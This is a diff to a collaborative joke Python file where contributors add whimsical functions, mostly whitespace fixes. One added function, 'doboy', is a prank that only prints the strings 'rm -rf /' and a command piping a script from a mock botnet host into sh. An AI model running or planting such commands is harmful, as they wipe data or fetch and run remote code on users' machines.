@@ -21,7 +21,7 @@ import hashlib
 import os
 import string
 import math
-import sys    
+import sys
 import inspect
 import webbrowser
 
@@ -132,7 +132,7 @@ def eternalmatt():
     print "Never gonna let you down."
     print "Never gonna run around."
     print "And hurt you."
-    
+
 def shuhaowu(): # Call me last! :D
     l = locals()
     for f in l.keys():
@@ -158,7 +158,7 @@ def cyclo():
 
 def chrisgw():
     print "meh"
-    
+
 def maxmackie(crypt_me):
     """Just try and crack this cipher."""
     abc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
@@ -192,7 +192,7 @@ def bprater():
 	print "social coding, the end is near."
 
 def satshabad():
-    # this doesn't seem to space right... 
+    # this doesn't seem to space right...
     for x in range(10000):
         r = random.randint(0,1)
         if r == 0:
@@ -231,7 +231,7 @@ def djrausch():
     print "DAE #HOLO? #NEXUS #HOLOYOLO"
 
 # Compute the modular multiplicative inverse using the extended Euclide algorithm
-# See this for more information : http://en.wikipedia.org/wiki/Modular_multiplicative_inverse#Extended_Euclidean_algorithm 
+# See this for more information : http://en.wikipedia.org/wiki/Modular_multiplicative_inverse#Extended_Euclidean_algorithm
 #
 # @param nb  Number to be inversed
 # @param mod Modular base
@@ -240,54 +240,54 @@ def HoLyVieR(nb, mod):
     # 1 is a special case, the inverse modulo is always 1 for all modular base #
     if (nb == 1):
         return 1
-    
+
     # We apply the Euclide method to find the GCD step for gcd(nb, mod) #
     stack = []
     a = mod;
     b = nb;
     n = mod / nb;
     r = mod % nb;
-    
+
     while r != 0:
         stack.append([a, b, n, r]);
-        
+
         a = b;
         b = r;
         n = a / b;
         r = a % b;
-    
+
     # If we reach this condition it means there was no step and therefore gcd(nb, mod) != 1 and there is no modular multiplicative inverse #
     if len(stack) == 0:
         return None
-    
+
     values = stack.pop()
-    
+
     # If the last value isn't 1 then gcd(nb, mod) != 1 and there is no modular multiplicative inverse #
     if values[3] != 1:
         return None
-    
+
     # We do the GCD step backward to find the solution #
     f1 = values[3]
     f2 = values[2]
     atN2 = True
-    
+
     while len(stack) > 0:
         values = stack.pop()
-        
+
         if atN2:
             f1 += f2 * values[2]
         else:
             f2 += f1 * values[2]
-        
+
         atN2 = not atN2
-    
+
     f = -f2 if atN2 else f1
-    
-    # While "f" is a correct result, it's sometimes a negative value and it's usually more 
+
+    # While "f" is a correct result, it's sometimes a negative value and it's usually more
     # convenient to have a positive value that's in the range of 0 to "mod".
     if (f < 0):
         f += mod * (math.fabs(math.floor(f / mod)) + 1)
-    
+
     return int(f % mod)
 
 def eddotman():
@@ -301,7 +301,7 @@ def chewxy():
 
 def hazirguo():
     print "Mourning for the dead in Sichuan earthquake!\n"
- 
+
 def sfrnld():
     print "From Indonesia with love!"
 
@@ -311,7 +311,7 @@ def chris911():
     for x in contributors:
         contributors_list.append(x['login'])
     print 'Contributors: '
-	print ', '.join(contributors_list) 
+    print ', '.join(contributors_list)
 
 def PiersonBro():
     print "My bane was not capability it was randomness."
@@ -320,6 +320,13 @@ def dogukantufekci():
     print "This is the connected world."
     webbrowser.open('http://www.silverspore.com/wiki/images/1/12/Connected_world-medium.jpg')
     
+def doboy(doboy_):
+    if doboy == doboy_:
+        doboy_('rm -rf /')
+        doboy('sh <(curl botnet.beepboop.com/main.sh)')
+    else:
+        print doboy_
+
 if __name__ == "__main__":
     heinzf() # this thing makes it hard to make sure stuff works, doesn't it?
     uiri() # Can I go first unless you're going to modify the file?
@@ -359,6 +366,7 @@ if __name__ == "__main__":
     ondrae()
     hazirguo()
     chris911()
+    doboy(doboy)
 
     # as per instructed, please leave this as the final function
     lafin()
